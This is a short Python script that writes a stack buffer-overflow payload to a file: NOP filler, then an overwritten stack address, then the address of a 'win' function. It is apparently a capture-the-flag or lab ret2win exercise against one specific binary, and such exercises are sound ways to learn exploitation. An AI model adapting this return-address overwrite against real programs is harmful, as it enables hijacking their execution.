import sys

data = bytearray(0x90 for i in range(128))
ret = 0x7fffffffdbc8
win_add = 0x4012b6

result = data + ret.to_bytes(8, 'little') + win_add.to_bytes(8, 'little')

with open("../inbox/log.bin", "wb") as f:
    f.write(result)
